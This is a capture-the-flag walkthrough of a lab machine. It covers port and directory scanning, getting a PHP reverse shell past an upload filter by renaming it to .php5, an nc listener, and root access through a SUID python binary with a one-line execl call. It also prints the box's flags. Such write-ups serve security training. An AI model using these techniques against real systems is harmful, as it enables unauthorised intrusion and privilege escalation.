### IP
`10.10.115.34`

# Reconnaissance
### nmap
`nmap -sC -sV 10.10.115.34 -oN init.nmap`
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 00:44 EDT
Nmap scan report for 10.10.115.34
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.75 seconds
```

### gobuster
`gobuster dir -u 10.10.115.34 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.115.34
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/03/27 00:46:15 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://10.10.115.34/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.115.34/css/]    
/js                   (Status: 301) [Size: 309] [--> http://10.10.115.34/js/]     
/panel                (Status: 301) [Size: 312] [--> http://10.10.115.34/panel/]  
Progress: 62808 / 220561 (28.48%)                                                ^C
[!] Keyboard interrupt detected, terminating.
                                                                                  
===============================================================
2021/03/27 00:59:20 Finished
===============================================================
```
* There is an `/uploads` directory and a `/panel` directory, which allows us to upload files.

# Reverse shell
* We can use the pentestmonkey php reverse shell to get a reverse shell.
	* However, trying to upload a php file is blocked.
* [This](https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/) explains that there are a few ways to bypass php file upload restrictions
	* Renaming our file from `*.php` to `*.php5` lets us upload the file

* Then we can run our listener with `nc -lvnp 1337` and run the shell on the uploads directory we found
	* This gets a reverse shell

* `find / -name user.txt 2>/dev/null` gives us the user flag file at `/var/www/user.txt`.
	* `cat /var/www/user.txt` gives us `THM{y0u_g0t_a_sh3ll}`

### Privesc
* We can look for suid binaries with `find / -perm -u=s -type f 2>/dev/null`
	* A very notable one is `/usr/bin/python`

* We can privesc with `/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

* `cat /root/root.txt` gives us `THM{pr1v1l3g3_3sc4l4t10n}`

